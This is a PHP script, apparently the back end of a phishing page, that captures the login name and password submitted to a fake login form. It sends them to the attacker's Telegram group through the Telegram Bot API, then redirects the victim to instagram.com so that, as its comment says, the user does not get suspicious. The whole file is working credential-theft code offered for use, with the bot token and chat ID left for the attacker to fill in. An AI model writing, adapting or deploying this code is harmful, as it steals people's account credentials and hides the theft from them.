<?php
// ['user_name'] - must match the name="" attribute of our <form>
$name = $_POST['user_name'];
// ['user_password'] - must match the name="" attribute of our <form>
$password = $_POST['user_password'];
// The token of the bot you created in Bot Father
$token = "";
// The ID of the group chat you created in Telegram
$chat_id = "";
// The data obtained from the variables $name and $password will come to us in format:
// login: admin
// password: password
$arr = array(
  'Login: ' => $name,
  'Password: ' => $password
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  // Redirect after the user logs in, so that the user doesn't get suspicious, use redirect to the social network/account that you linked to when you sent the message to them.
  header('Location: https://instagram.com');
} else {
  echo "Error";
}
?>